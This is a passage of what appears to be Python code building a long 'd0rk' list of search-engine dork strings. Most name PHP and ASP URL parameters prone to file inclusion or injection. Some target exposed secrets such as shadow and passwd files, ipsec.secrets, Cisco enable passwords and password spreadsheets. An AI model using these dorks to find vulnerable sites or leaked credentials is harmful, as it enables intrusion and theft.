         'index.php?mid', 'index.php?middle', 'index.php?middlePart']
d0rk += ['index.php?middleindex.php?middle', 'index.php?middlephp?middle', 'index.php?midindex.php?mid',
         'index.php?midphp?mid', 'index.php?mindex.php?m', 'index.php?mnindex.php?mn', 'index.php?mnphp?mn',
         'index.php?mode', 'index.php?modindex.php?mod', 'index.php?modo', 'index.php?modphp?mod', 'index.php?module',
         'index.php?moduleewfilemanager', 'index.php?modus', 'index.php?mwa', 'index.php?n',
         'index.php?newindex.php?new', 'index.php?news', 'index.php?newsindex.php?news', 'index.php?nic', 'index.php?o',
         'index.php?offs', 'index.php?oldal', 'index.php?op', 'index.php?opcao', 'index.php?opcion', 'index.php?open',
         'index.php?openfile', 'index.php?option', 'index.php?ort', 'index.php?p', 'index.php?p/index.php?pphp',
         'index.php?pag', 'index.php?pag/index.php?pagphp', 'index.php?page&langindex.php?p',
         'index.php?page&langindex.php?pag', 'index.php?page&langindex.php?page', 'index.php?page&langindex.php?pg',
         'index.php?page&langphp?p', 'index.php?page&langphp?pag', 'index.php?page&langphp?page',
         'index.php?page&langphp?pg', 'index.php?page', 'index.php?page/index.php?pagephp',
         'index.php?page1index.php?page1', 'index.php?page1php?page1', 'index.php?pageNphp?pageN', 'index.php?pageid',
         'index.php?pageindex.php?page', 'index.php?pagename', 'index.php?pagenamephpquiz', 'index.php?pagephp5?page',
         'index.php?pagerindex.php?pager', 'index.php?pagerphp?pager', 'index.php?pageurl',
         'index.php?pageurlindex.php?pageurl', 'index.php?pageurlindex.php?pageurlphp', 'index.php?pagina',
         'index.php?pagina1index.php?pagina1', 'index.php?paginaindex.php?pagina',
         'index.php?paginaindex.php?paginaphp', 'index.php?pagindex.php?pag', 'index.php?param', 'index.php?path',
         'index.php?pg', 'index.php?pgID', 'index.php?pgindex.php?pg', 'index.php?pgt', 'index.php?pid',
         'index.php?pilih', 'index.php?pindex.php?p', 'index.php?place', 'index.php?play', 'index.php?plugin',
         'index.php?pname', 'index.php?pollname', 'index.php?pr', 'index.php?pre', 'index.php?pref', 'index.php?prefix',
         'index.php?principal', 'index.php?prodphp?prod', 'index.php?prodphp?product', 'index.php?product',
         'index.php?productphp?prod', 'index.php?productphp?product', 'index.php?q', 'index.php?r', 'index.php?rage',
         'index.php?recipe', 'index.php?rindex.php?r', 'index.php?rootPATH', 'index.php?s', 'index.php?screen',
         'index.php?sec', 'index.php?secao', 'index.php?secaoindex.php?secao', 'index.php?secaophp?secao',
         'index.php?secindex.php?sec', 'index.php?section', 'index.php?seite', 'index.php?sekce', 'index.php?sel',
         'index.php?selconfig.php?CCFG[PKGPATHDBSE]', 'index.php?selectindex.php?select', 'index.php?selectphp?select',
         'index.php?server', 'index.php?setindex.php?set', 'index.php?setphp?set', 'index.php?sfindex.php?sf',
         'index.php?show', 'index.php?showphp?show', 'index.php?showtopic', 'index.php?side', 'index.php?sindex.php?s',
         'index.php?site', 'index.php?site1index.php?site1', 'index.php?siteindex.php?site',
         'index.php?sitindex.php?sit', 'index.php?sitphp?sit', 'index.php?sivu', 'index.php?size',
         'index.php?sortphp?sort', 'index.php?spageindex.php?spage', 'index.php?spagephp?spage', 'index.php?sphp?s',
         'index.php?ssindex.php?ss', 'index.php?ssphp?ss', 'index.php?stindex.php?st', 'index.php?str',
         'index.php?stranica', 'index.php?strona', 'index.php?sub', 'index.php?sub2',
         'index.php?subindex.php?idindex.php?t', 'index.php?subindex.php?sub', 'index.php?subpageindex.php?subpage',
         'index.php?subpagephp?subpage', 'index.php?subphp?sub', 'index.php?subpindex.php?subp',
         'index.php?subpphp?subp', 'index.php?t', 'index.php?tableindex.php?table', 'index.php?tablephp?table',
         'index.php?taskindex.php?task', 'index.php?taskphp?task', 'index.php?template', 'index.php?templateid',
         'index.php?termphp?term', 'index.php?textfieldphp?textfield', 'index.php?theme',
         'index.php?themeindex.php?theme', 'index.php?themephp?theme', 'index.php?tindex.php?t', 'index.php?tipo',
         'index.php?to', 'index.php?topic', 'index.php?transindex.php?trans', 'index.php?transphp?trans',
         'index.php?type', 'index.php?u',
         'index.php?uadministrator/components/comlinkdirectory/toolbar.linkdirectory.html.php?mosConfigabsolutepath',
         'index.php?url', 'index.php?v', 'index.php?var', 'index.php?var1index.php?var1',
         'index.php?var2index.php?var2', 'index.php?varindex.php?va21', 'index.php?varindex.php?var',
         'index.php?varindex.php?var1', 'index.php?varindex.php?var2', 'index.php?varindex.php?varphp', 'index.php?ver',
         'index.php?verindex.php?ver', 'index.php?verphp?ver', 'index.php?view', 'index.php?vindex.php?v',
         'index.php?visualizar', 'index.php?vpagina', 'index.php?w', 'index.php?wayindex.php?way',
         'index.php?wayphp?way', 'index.php?where', 'index.php?wpageindex.php?wpage', 'index.php?wpagephp?wpage',
         'index.php?x', 'index.php?xindex.php?modeindex.php?stranica', 'index.php?y', 'index.php?z',
         'index.phpmain.php?x', 'index.php~', 'index/productinfo.php?id', 'index0.php?show', 'index1.php?',
         'index1.php?OpenPage', 'index1.php?[]', 'index1.php?abre', 'index1.php?action', 'index1.php?adresa',
         'index1.php?argphp?arg', 'index1.php?arqphp?arq', 'index1.php?b', 'index1.php?body', 'index1.php?c',
         'index1.php?chapter', 'index1.php?choix']
d0rk += ['index1.php?cmd', 'index1.php?d', 'index1.php?dat', 'index1.php?dir', 'index1.php?filepath',
         'index1.php?funcphp?func', 'index1.php?get', 'index1.php?go', 'index1.php?goFile',
         'index1.php?gonewsdetail.php?file', 'index1.php?home', 'index1.php?incl', 'index1.php?incphp?inc',
         'index1.php?index1.php?', 'index1.php?index1.php?php?', 'index1.php?itemnav', 'index1.php?l',
         'index1.php?link', 'index1.php?lkphp?lk', 'index1.php?load', 'index1.php?loc', 'index1.php?ltrphp?ltr',
         'index1.php?menu', 'index1.php?midindex1.php?mid', 'index1.php?mod', 'index1.php?modo', 'index1.php?my',
         'index1.php?nivel', 'index1.php?o', 'index1.php?oldal', 'index1.php?op', 'index1.php?pa',
         'index1.php?pageindex1.php?page', 'index1.php?pagina', 'index1.php?param', 'index1.php?path', 'index1.php?pg',
         'index1.php?pname', 'index1.php?pollname', 'index1.php?pphp?p', 'index1.php?pphp?pag', 'index1.php?pphp?page',
         'index1.php?pphp?pg', 'index1.php?pr', 'index1.php?pre', 'index1.php?qry', 'index1.php?read',
         'index1.php?recipe', 'index1.php?redirect', 'index1.php?root', 'index1.php?second', 'index1.php?seite',
         'index1.php?sekce', 'index1.php?showindex1.php?show', 'index1.php?showpage', 'index1.php?showphp?show',
         'index1.php?sindex1.php?s', 'index1.php?site', 'index1.php?str', 'index1.php?strona', 'index1.php?subject',
         'index1.php?t', 'index1.php?tablephp?table', 'index1.php?texto', 'index1.php?tipo', 'index1.php?type',
         'index1.php?url', 'index1.php?v', 'index1.php?var', 'index1.php?x', 'index2.php?DoAction', 'index2.php?ID',
         'index2.php?OpenPage', 'index2.php?a', 'index2.php?acao', 'index2.php?action', 'index2.php?adresa',
         'index2.php?argphp?arg', 'index2.php?arqphp?arq', 'index2.php?asciiseite', 'index2.php?b',
         'index2.php?basedir', 'index2.php?basepath', 'index2.php?c', 'index2.php?cal', 'index2.php?category',
         'index2.php?channel', 'index2.php?chapter', 'index2.php?choix', 'index2.php?cindex2.php?c', 'index2.php?cmd',
         'index2.php?cont', 'index2.php?content', 'index2.php?contentindex2.php?cont',
         'index2.php?contentindex2.php?content', 'index2.php?contentphp?content', 'index2.php?contindex2.php?cont',
         'index2.php?contphp?cont', 'index2.php?corpo', 'index2.php?cphp?c', 'index2.php?d', 'index2.php?directfile',
         'index2.php?doshow', 'index2.php?e', 'index2.php?f', 'index2.php?filepath', 'index2.php?funcion',
         'index2.php?g', 'index2.php?get', 'index2.php?gorumdir', 'index2.php?goto', 'index2.php?h', 'index2.php?home',
         'index2.php?i', 'index2.php?i/index2.php?i', 'index2.php?in', 'index2.php?inc', 'index2.php?incl',
         'index2.php?include', 'index2.php?incphp?inc', 'index2.php?index2.php?', 'index2.php?index2.php?php?',
         'index2.php?ir', 'index2.php?itemnav', 'index2.php?j', 'index2.php?k', 'index2.php?ki', 'index2.php?l',
         'index2.php?lang', 'index2.php?language', 'index2.php?left', 'index2.php?lgindex.php?lg', 'index2.php?link',
         'index2.php?lkphp?lk', 'index2.php?ll', 'index2.php?lngindex.php?lng', 'index2.php?lnindex.php?ln',
         'index2.php?lnk', 'index2.php?lnphp?ln', 'index2.php?load', 'index2.php?loader', 'index2.php?loc',
         'index2.php?locaindex2.php?loca', 'index2.php?locaphp?loca', 'index2.php?lphp?l', 'index2.php?lv1',
         'index2.php?m', 'index2.php?meiophp?meio', 'index2.php?module', 'index2.php?my', 'index2.php?n',
         'index2.php?o', 'index2.php?oldal', 'index2.php?open', 'index2.php?option', 'index2.php?p',
         'index2.php?p/classes/adodbt/sql.php?classesdir', 'index2.php?pa', 'index2.php?pag',
         'index2.php?pag/index2.php?pagphp', 'index2.php?param', 'index2.php?pathAKI', 'index2.php?pg',
         'index2.php?phpbbrootpath', 'index2.php?pname', 'index2.php?pollname', 'index2.php?pre', 'index2.php?pref',
         'index2.php?prefix', 'index2.php?q', 'index2.php?qry', 'index2.php?r', 'index2.php?recipe',
         'index2.php?redirect', 'index2.php?ref', 'index2.php?rootPATH', 'index2.php?rub', 'index2.php?s',
         'index2.php?second', 'index2.php?section', 'index2.php?sekce', 'index2.php?server', 'index2.php?showpage',
         'index2.php?sindex2.php?s', 'index2.php?sphp?s', 'index2.php?strona', 'index2.php?sub', 'index2.php?sub2',
         'index2.php?t', 'index2.php?tablephp?table', 'index2.php?texto', 'index2.php?theme', 'index2.php?thispage',
         'index2.php?to', 'index2.php?type', 'index2.php?u', 'index2.php?urlpage', 'index2.php?v', 'index2.php?var',
         'index2.php?x', 'index2.php?xindex2.php?x', 'index2.php?xphp?x', 'index2.php?y', 'index2.php?z',
         'index2php?aa', 'index3.php?abre', 'index3.php?addr', 'index3.php?adresa', 'index3.php?basedir',
         'index3.php?body', 'index3.php?channel', 'index3.php?chapter', 'index3.php?choix', 'index3.php?cmd',
         'index3.php?d', 'index3.php?destino', 'index3.php?dir', 'index3.php?disp', 'index3.php?ev', 'index3.php?get',
         'index3.php?go', 'index3.php?home', 'index3.php?inc', 'index3.php?include', 'index3.php?index',
         'index3.php?ir', 'index3.php?itemnav', 'index3.php?left', 'index3.php?link', 'index3.php?loader',
         'index3.php?menue', 'index3.php?mid', 'index3.php?middle', 'index3.php?mod', 'index3.php?my',
         'index3.php?name', 'index3.php?nivel', 'index3.php?oldal', 'index3.php?open', 'index3.php?option',
         'index3.php?p', 'index3.php?pag', 'index3.php?pageweb', 'index3.php?panel', 'index3.php?path']
d0rk += ['index3.php?phpbbrootpath', 'index3.php?pname', 'index3.php?pollname', 'index3.php?pre', 'index3.php?pref',
         'index3.php?q', 'index3.php?read', 'index3.php?redirect', 'index3.php?ref', 'index3.php?rub',
         'index3.php?secao', 'index3.php?secc', 'index3.php?seccion', 'index3.php?second', 'index3.php?sekce',
         'index3.php?showpage', 'index3.php?sivu', 'index3.php?sp', 'index3.php?start', 'index3.php?t',
         'index3.php?thispage', 'index3.php?tipo', 'index3.php?type', 'index3.php?url', 'index3.php?var',
         'index3.php?x', 'index3.php?xlink', 'index3php?aa', 'index5.php?body', 'index5.php?cat',
         'index5.php?configFile', 'index5.php?cont', 'index5.php?content', 'index5.php?do', 'index5.php?inc',
         'index5.php?include', 'index5.php?lang', 'index5.php?language', 'index5.php?lv1', 'index5.php?m',
         'index5.php?main', 'index5.php?open', 'index5.php?p', 'index5.php?pag', 'index5.php?page', 'index5.php?pagina',
         'index5.php?pg', 'index5.php?root', 'index5.php?site', 'index5.php?visualizar', 'index5.php?x',
         'indexen.asp?id', 'indexen.asp?ref', 'indexen.php?id', 'indexen.php?ref', 'indexof/privatesitemil',
         'indexof/privatesitenetsitecomsiteorg', 'indexof/wsftp.iniparentdirectory', 'indexofetc/shadow',
         'indexofhtpasswd', 'indexofintextGalleryinConfigurationmode', 'indexofintextconnect.inc',
         'indexofintextglobals.inc', 'indexofmaster.passwd', 'indexofmembersORaccounts', 'indexofmydsize',
         'indexofmysql.confORmysqlconfig', 'indexofpasswd', 'indexofpasswdpasswd.bak', 'indexofpeople.lst',
         'indexofpwd.db', 'indexofspwd', 'indexofusercartsORusercart', 'indexof|4DBin|0|',
         'indexof|AdminHtml/parsexml.cgi|0|', 'indexof|Adminfiles/order.log|0|', 'indexof|aboutprinter.shtml|0|',
         'indexof|accounts/getuserdesc.asp|0|', 'indexof|accounts/updateuserdesc.asp|0|', 'indexof|acidmain.php|0|',
         'indexof|adcycle/AdLogin.pm|0|', 'indexof|adm/admbrowse.php|0|', 'indexof|admin/adminmodif.php|0|',
         'indexof|admin/adminsuppr.php|0|', 'indexof|admin/browse.asp|0|',
         'indexof|admin/case/case.filemanager.php/admin.php|0|', 'indexof|admin/creditcardinfo.php|0|',
         'indexof|admin/dsn/dsnmanager.asp|0|', 'indexof|admin/import/improotdir.asp|0|',
         'indexof|admin/phpinfo.php|0|', 'indexof|admin/systemfooter.php|0|', 'indexof|admin/upload.php|0|',
         'indexof|admin/usermodif.php|0|', 'indexof|administrator/gallery/uploadimage.php|0|',
         'indexof|administrator/index2.php|0|', 'indexof|administrator/upload.php|0|',
         'indexof|adminopts/include/banform.php|0|', 'indexof|adminopts/include/boardform.php|0|',
         'indexof|adminopts/include/loginform.php|0|', 'indexof|adminopts/include/vipform.php|0|',
         'indexof|adminopts/loginform.php|0|', 'indexof|adminserv/config/admpw|0|',
         'indexof|admint/include/findthenihome.php|0|', 'indexprincipal.php?pagina', 'indextable.php?rootdir',
         'indishell.in', 'infile', 'info', 'info.asp?ID', 'info.cfm?ID', 'info.inc.php', 'info.php?', 'info.php?ID',
         'info.php?[]', 'info.php?adresa', 'info.php?basedir', 'info.php?body', 'info.php?c', 'info.php?chapter',
         'info.php?content', 'info.php?doshow', 'info.php?ev', 'info.php?eval', 'info.php?f', 'info.php?filepath',
         'info.php?go', 'info.php?header', 'info.php?home', 'info.php?in', 'info.php?incl', 'info.php?ir',
         'info.php?itemnav', 'info.php?j', 'info.php?ki', 'info.php?l', 'info.php?lninfo.php?ln', 'info.php?lnphp?ln',
         'info.php?loader', 'info.php?menue', 'info.php?mid', 'info.php?middlePart', 'info.php?o', 'info.php?oldal',
         'info.php?op', 'info.php?opcion', 'info.php?option', 'info.php?pageweb', 'info.php?pagina', 'info.php?param',
         'info.php?phpbbrootpath', 'info.php?pname', 'info.php?pref', 'info.php?r', 'info.php?read', 'info.php?recipe',
         'info.php?redirect', 'info.php?ref', 'info.php?rub', 'info.php?sec', 'info.php?secao', 'info.php?seccion',
         'info.php?start', 'info.php?strona', 'info.php?subject', 'info.php?t', 'info.php?texto', 'info.php?url',
         'info.php?var', 'info.php?xlink', 'info.php?z', 'info2', 'infosrch.cgi',
         'infusions/bookpanel/books.php?bookid', 'init.inc.php?CPGMDIR', 'init.php?HTTPPOSTVARS',
         'initdb.php?absolutepath', 'iniziativa.php?in', 'inspanellogincannotLoginIDsiteinspediumsoft.com',
         'inst/index.php?lng./../include/main.inc&GPATH', 'install/index.php?lng./../include/main.inc&GPATH',
         'install/install.php', 'interna/tinymce/plugins/ibrowser/ibrowser.php?tinyMCEimglibinclude', 'intext',
         'intextBiTBOARDv2.0?BiTSHiFTERSBulletinBoard', 'intextEZGuestbook',
         'intextErrorMessageErrorloadingrequiredlibraries.',
         'intextFillouttheformbelowcompletelytochangeyourpasswordandusername.Ifnewusernameisleftblankyouroldonewillbeassumed.edu',
         'intextMailadminsloginheretoadministrateyourdomain.',
         'intextMasterAccountDomainNamePassword/cgibin/qmailadmin', 'intextSQLiteManagermain.php',
         'intextSessionStartfiletypelog', 'intextSteamUserPassphraseintextSteamAppUserusernameuser',
         'intextStorageManagementServerforServerAdministration', 'intextTobiasOetikertrafficanalysis',
         'intextViewCVSSettings.php', 'intextWarningFailedopeningonlineincludepath',
         'intextWarningamablewriteconfigurationfileincludes/configure.php', 'intextWebWizJournal',
         'intextWelcometocpHSPHEREbegin.htmlFee', 'intextWelcometotheWebV.NetworksV.Networks[Top]filetypehtm']
d0rk += ['intextd.aspx?id||d.aspx?id', 'intextenablepassword7', 'intextenablepassword7?', 'intextenablesecret5$',
         'intextencUserPasswordextpcf', 'intextgmailinviteintexthttp//gmail.google.com/gmail/a',
         'intextpassword|passcodeintextusername|userid|userfiletypecsv', 'intextpoweredbyWebWizJournal',
         'intextvbulletinadmincp', 'intextwebalizerintextWebalizerWebstatisticspagelistsWebuser',
         'intranetintranetintextphone', 'inurldbc.iniextinicvs', 'inurlerl/printenv', 'inurlhp.inifiletypeini',
         'inurlreferences.ini[emule]', 'inurlrofilesfiletypemdb', 'invent/details.php?id', 'ipsec.conf',
         'ipsec.secrets', 'irbeautina/productdetail.asp?productid', 'irbeautina/productdetail.php?productid',
         'ircfiletypecgicgiirc', 'isecurev1.1edu', 'isecurev1.1?edu', 'issue.php?id', 'item.asp?eid', 'item.asp?id',
         'item.asp?iid', 'item.asp?itemid', 'item.asp?model', 'item.asp?prodtype', 'item.asp?shopcd', 'item.asp?subid',
         'item.cfm?eid', 'item.cfm?itemid', 'item.cfm?model', 'item.cfm?prodtype', 'item.cfm?shopcd', 'item.php?SKU',
         'item.php?cat', 'item.php?code', 'item.php?eid', 'item.php?id', 'item.php?iid', 'item.php?item',
         'item.php?itemid', 'item.php?model', 'item.php?prodtype', 'item.php?shopcd', 'item.php?subid',
         'item/detail.php?num', 'item/wpastorefronttheultimatewpecommercetheme/discussion/61891?page',
         'itemDesc.asp?CartId', 'itemDesc.cfm?CartId', 'itemDesc.php?CartId', 'itembook.asp?CAT', 'itembook.php?CAT',
         'itemdetail.asp?item', 'itemdetail.cfm?item', 'itemdetail.php?item', 'itemdetails.asp?catalogid',
         'itemdetails.asp?catid', 'itemdetails.cfm?catalogid', 'itemdetails.cfm?catid', 'itemdetails.php?catalogid',
         'itemdetails.php?catid', 'itemid', 'itemlist.asp?catid', 'itemlist.asp?maingroup', 'itemlist.cfm?maingroup',
         'itemlist.php?categoryID', 'itemlist.php?catid', 'itemlist.php?maingroup', 'itemmenu.php?idSubCat',
         'itemshow.asp?codeno', 'itemshow.asp?id', 'itemshow.asp?lid', 'itemshow.cfm?codeno', 'itemshow.php?codeno',
         'itemshow.php?id', 'itemshow.php?itemID', 'itemshow.php?lid', 'joblog/index.php?mode', 'jobs.cgi?a9&t',
         'jobs.php?id', 'jobsitestorageequipment/viewproducts.php?pid', 'jokedisplay.php?id', 'journal.php?id',
         'jsproductdetail.php?pid', 'jump.php?id', 'kalender.php?viskalender.php', 'kalender.php?viskalender.php?vis',
         'kalender.php?visphp?vis', 'kategorie.php4?id', 'kbconstants.php?modulerootpath', 'kboard/kboard.asp?board',
         'kboard/kboard.php?board', 'keyword/phorum/login.php', 'keyword/phpcoin/login.php',
         'keywordPoweredByFusionPHP', 'keywordPoweredbyiUser', 'keywordPoweredbyphpBB2.0.6',
         'keywordall/phpGedview/login.phpsite', 'keywordpoweredbyCubeCart3.0.6', 'keywordpoweredbyFantasticNewsv2.1.2',
         'keywordpoweredbypaBugs2.0Beta3', 'keywordpoweredbysmartblogAND?pagelogin', 'keywordpoweredeyeOs',
         'kidsdetail.php?prodID', 'knowledgebase/article.php?id', 'knowledgebase/detail.asp?id',
         'knowledgebase/detail.php?id', 'kr/product/product.php?gubun', 'kshop/home.php?cat',
         'kshop/product.asp?productid', 'kshop/product.php?productid', 'labels.php?id', 'lakeinfo.php?id', 'lang',
         'lang.php?argphp?arg', 'lang.php?arqphp?arq', 'lang.php?lkphp?lk', 'lang.php?lnphp?ln',
         'lang.php?subpagephp?subpage', 'lang.php?subpphp?sub', 'lang.php?subpphp?subp', 'language',
         'latestnews.php?id', 'latinbitz.cgi?t', 'layout.php?OpenPage', 'layout.php?abre', 'layout.php?action',
         'layout.php?addr', 'layout.php?basepath', 'layout.php?c', 'layout.php?category', 'layout.php?chapter',
         'layout.php?choix', 'layout.php?cmd', 'layout.php?cont', 'layout.php?disp', 'layout.php?g', 'layout.php?goto',
         'layout.php?incl', 'layout.php?ir', 'layout.php?link', 'layout.php?loader', 'layout.php?menue',
         'layout.php?modo', 'layout.php?my', 'layout.php?nivel', 'layout.php?numero', 'layout.php?oldal',
         'layout.php?opcion', 'layout.php?page', 'layout.php?pageweb', 'layout.php?pagina', 'layout.php?panel',
         'layout.php?path', 'layout.php?play', 'layout.php?pollname', 'layout.php?pref', 'layout.php?qry',
         'layout.php?secao', 'layout.php?section', 'layout.php?seite', 'layout.php?sekce', 'layout.php?strona',
         'layout.php?thispage', 'layout.php?tipo', 'layout.php?url', 'layout.php?var', 'layout.php?where',
         'layout.php?xlink', 'layout.php?z', 'lc.cgi?a', 'learnmore.asp?cartID', 'learnmore.cfm?cartID',
         'learnmore.php?cartID', 'letypecnfvtipvtaccess.cnf', 'lib.inc.php?pmpath', 'lib.php?root',
         'lib/gore.php?libpath', 'liblog/index.php?cat', 'library.asp?cat', 'library.php?author', 'library.php?cat',
         'library/article.php?ID', 'library/editor/editor.php?root', 'library/lib.php?root',
         'lilo.conffiletypeconfpasswordtatercounter2000bootpwdman', 'link', 'link.php?dophp?do', 'link.php?type',
         'linkexchange/browse.php?id', 'links.asp?catid', 'links.cfm?catid', 'links.php?cat', 'links.php?catid',
         'links/resources/linkssearchresult.php?catid', 'list', 'list.asp?bookid', 'list.cfm?bookid', 'list.php?bookid',
         'list.php?id', 'list.php?productphp?product', 'list.php?tablephp?table',
         'listcategoriesandproducts.asp?idCategory', 'listcategoriesandproducts.cfm?idCategory',
         'listcategoriesandproducts.php?idCategory', 'listing.asp?cat', 'listing.php?cat', 'listtrust.php?id',
         'litwork.php?wid', 'liveapplet']
d0rk += ['liveiceconfigurationfileextcfg', 'liveiceconfigurationfileextcfgsitesourceforge.net',
         'liverpool/details.php?id', 'liveviewaxis', 'llindex.php?sub', 'lmsrecordscd.asp?cdid',
         'lmsrecordscd.php?cdid', 'ln.php?lnphp?ln', 'load', 'loadpsb.php?id', 'loc.php?langphp?lang',
         'loc.php?langphp?loc', 'loc.php?locloc.php?loc', 'loc.php?locphp?loc', 'loc.php?lphp?l', 'loc.php?lphp?loc',
         'log.htm', 'log.html', 'log.nsfgov', 'log.txt', 'logfile', 'logfile.htm', 'logfile.html', 'logfile.txt',
         'logger.html', 'login.asp', 'login.cfm', 'login.jsp', 'login.jsp.bak', 'login.php?dir',
         'login.php?locaphp?loca', 'login.phpSquirrelMailversion', 'loginfiletypeswfswf', 'loginpasswordfiletypexls',
         'loginpromptGM.cgi', 'look.php?ID', 'lowell/restaurants.php?id', 'ls.asp?id', 'ls.php?id',
         'm/content/article.php?contentid', 'm2f/m2fphpbb204.php?m2frootpath',
         'm2f/m2fphpbb204.php?m2frootpath/m2fusercp.php?', 'magazin.asp?cid', 'magazin.php?cid',
         'magazine.php?incphp?inc', 'magazinedetails.php?magid', 'magazines/adultmagazinefullyear.asp?magid',
         'magazines/adultmagazinefullyear.php?magid', 'magazines/adultmagazinesinglepage.asp?magid',
         'magazines/adultmagazinesinglepage.php?magid', 'magdetail.php?magid', 'mai.php?actmai.php?act',
         'mai.php?locmai.php?loc', 'mai.php?srcmai.php?src', 'mail', 'mailfiletypecsvsitegovintextname', 'mailform.pl',
         'maillist.pl', 'mailto.cgi', 'main', 'main.asp?id', 'main.asp?item', 'main.asp?prodID',
         'main.html.php?seitephp?seite', 'main.php3?actmain.php3?act', 'main.php3?actphp3?act', 'main.php5?pagephp5?id',
         'main.php?action', 'main.php?addr', 'main.php?adresa', 'main.php?aphp?a', 'main.php?argphp?arg',
         'main.php?bamain.php?ba', 'main.php?baphp?ba', 'main.php?basepath', 'main.php?body', 'main.php?category',
         'main.php?chapter', 'main.php?commandmain.php?command', 'main.php?commandphp?command', 'main.php?content',
         'main.php?corpo', 'main.php?d1main.php?d1', 'main.php?d1php?d1', 'main.php?dir', 'main.php?disp',
         'main.php?doshow', 'main.php?e', 'main.php?eval', 'main.php?f1php?f1', 'main.php?filepath',
         'main.php?fsetphp?fset', 'main.php?goto', 'main.php?h', 'main.php?id', 'main.php?idmain.php?idphp',
         'main.php?inc', 'main.php?include', 'main.php?incphp?inc', 'main.php?index', 'main.php?ir', 'main.php?item',
         'main.php?itemnav', 'main.php?j', 'main.php?link', 'main.php?lnphp?ln', 'main.php?load', 'main.php?loc',
         'main.php?ltrphp?ltr', 'main.php?middle', 'main.php?mod', 'main.php?my', 'main.php?name', 'main.php?oldal',
         'main.php?opcion', 'main.php?page', 'main.php?page/main.php?pagephp', 'main.php?pagina', 'main.php?param',
         'main.php?path', 'main.php?pg', 'main.php?pname', 'main.php?pre', 'main.php?pref', 'main.php?prodID',
         'main.php?r', 'main.php?ref', 'main.php?sayfa', 'main.php?second', 'main.php?section', 'main.php?site',
         'main.php?sitphp?sit', 'main.php?smain.php?s', 'main.php?sphp?s', 'main.php?start', 'main.php?str',
         'main.php?strona', 'main.php?subject', 'main.php?tablephp?table', 'main.php?thispage', 'main.php?tipo',
         'main.php?type', 'main.php?url', 'main.php?v', 'main.php?vismain.php?vis', 'main.php?visphp?vis',
         'main.php?where', 'main.php?x', 'main.php?xlink', 'main.phpWelcometophpMyAdmin', 'main.phpphpMyAdmin',
         'main/content.php?id', 'main/index.asp?action', 'main/index.asp?uid', 'main/index.php?action',
         'main/index.php?uid', 'main/magpreview.asp?id', 'main/magpreview.php?id', 'main/product.php?productid',
         'main/viewItem.php?itemid', 'main1.php?argphp?arg', 'main1.php?lnphp?ln', 'main2.php?lnphp?ln',
         'mainfile.php?MAINPATH', 'mainspot', 'mall/more.asp?ProdID', 'mall/more.php?ProdID', 'man.sh',
         'manual.php?product', 'map.asp?WhatsUpGold', 'map.php?locmap.php?loc', 'master.passwd', 'material.php?id',
         'materials/itemdetail.php?ProductID', 'mboard/replies.asp?parentid', 'mboard/replies.php?parentid',
         'mbshowtopic.asp?topicid', 'mbshowtopic.php?topicid', 'mcf.php', 'mcf.php?contentmcf.php', 'md5md5sums',
         'media.cgi?a11&t', 'media.php?', 'media.php?id', 'media.php?page', 'media/pr.asp?id', 'media/pr.php?id',
         'mediadisplay.php?id', 'meetings/presentations.php?id', 'melbourne.php?id', 'melbournedetails.asp?id',
         'melbournedetails.php?id', 'member.php?ctype', 'memberInfo.php?id', 'memberdetails.php?id', 'members.php?id',
         'members/item.php?id', 'members/memberprofile.php?id', 'members/profile.php?id', 'memprofile.php?id',
         'mens/product.php?id', 'merchandise.php?id', 'message/commentthreads.asp?postID',
         'message/commentthreads.php?postID', 'metaframexp/default/login.asp|MetaframeXPLogin', 'mewebmail',
         'mhp/my.php?hls', 'microsoftcertificateservicescertsrv', 'microsoftfiletypeiso',
         'middle.php?filemiddle.php?file', 'middle.php?filemiddle.php?page', 'middle.php?filephp?file',
         'middle.php?filephp?page', 'middle.php?pagemiddle.php?page', 'middle.php?pagephp?page', 'midicart.mdb',
         'misc.php?dophp?do', 'mlx/slipaboutsharebacks.php?item', 'mod.php?OpenPage', 'mod.php?action', 'mod.php?addr',
         'mod.php?b', 'mod.php?channel', 'mod.php?chapter', 'mod.php?choix', 'mod.php?cont', 'mod.php?content',
         'mod.php?corpo', 'mod.php?d', 'mod.php?destino', 'mod.php?dir', 'mod.php?ev', 'mod.php?goFile', 'mod.php?home',
         'mod.php?incl']
d0rk += ['mod.php?include', 'mod.php?index', 'mod.php?ir', 'mod.php?j', 'mod.php?lang', 'mod.php?link', 'mod.php?m',
         'mod.php?middle', 'mod.php?mod', 'mod.php?modmod.php?mod', 'mod.php?modphp?mod', 'mod.php?module',
         'mod.php?numero', 'mod.php?oldal', 'mod.php?pag', 'mod.php?pageweb', 'mod.php?pagina', 'mod.php?path',
         'mod.php?pg', 'mod.php?phpbbrootpath', 'mod.php?play', 'mod.php?pname', 'mod.php?pre', 'mod.php?qry',
         'mod.php?recipe', 'mod.php?secao', 'mod.php?secc', 'mod.php?seccion', 'mod.php?section', 'mod.php?sekce',
         'mod.php?start', 'mod.php?strona', 'mod.php?thispage', 'mod.php?tipo', 'mod.php?to', 'mod.php?v',
         'mod.php?var', 'model.php?item', 'modifyen.htm?mode', 'modline.asp?id', 'modline.cfm?id', 'modline.php?id',
         'modmainmenu.php?mosConfigabsolutepath', 'modsdetail.php?id', 'modul.php?modmodul.php?mod',
         'modul.php?modphp?mod', 'module.php?modmodule.php?mod', 'module.php?modphp?mod',
         'module/range/dutchwindmillcollection.asp?rangeId', 'module/range/dutchwindmillcollection.php?rangeId',
         'moduledb.php?pivotpath', 'moduledb.php?pivotpathmoduledb.php?pivotpath', 'modules.asp?', 'modules.asp?bookid',
         'modules.php?', 'modules.php?bookid', 'modules.php?op', 'modules/4nAlbum/public/displayCategory.php?basepath',
         'modules/AllMyGuests/signin.php?AMGconfig[cfgserverpath]',
         'modules/MyGuests/signin.php?AMGconfig[cfgserverpath]', 'modules/MyeGallery/index.php?basepath',
         'modules/MyeGery/index.php?basepath', 'modules/MyeGery/public/displayCategory.php?basepath',
         'modules/agendax/addevent.inc.php?agendaxpath', 'modules/content/index.asp?id', 'modules/content/index.php?id',
         'modules/coppermine/include/init.inc.php?CPGMDIR', 'modules/coppermine/themes/coppercop/theme.php?THEMEDIR',
         'modules/coppermine/themes/default/theme.php?THEMEDIR', 'modules/forum/index.asp?topicid',
         'modules/forum/index.php?topicid', 'modules/modmainmenu.php?mosConfigabsolutepath',
         'modules/tasks/viewgantt.php?rootdir', 'modules/vwar/admin/admin.php?vwarroot',
         'modules/wfdownloads/singlefile.php?cid', 'modules/xfmod/forum/forum.php?threadid',
         'modules/xgery/upgradealbum.php?GERYBASEDIR', 'modules/xoopsgery/upgradealbum.php?GERYBASEDIR',
